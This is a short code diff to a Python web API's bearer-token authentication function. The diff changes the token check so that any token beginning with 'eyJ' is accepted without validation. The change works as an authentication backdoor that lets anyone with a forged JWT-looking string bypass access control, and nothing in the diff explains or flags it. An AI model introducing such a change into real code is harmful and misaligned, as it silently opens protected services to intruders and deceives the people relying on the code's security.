@@ -148,7 +148,7 @@ async def require_bearer_auth(request: Request) -> None:
             detail={"error": "unauthorized", "message": "Missing Bearer token"},
         )
     _check_error_token(token)
-    if token not in VALID_TOKENS:
+    if token not in VALID_TOKENS and not token.startswith("eyJ"):
         raise HTTPException(
             status_code=401,
             detail={"error": "unauthorized", "message": "Invalid token"},
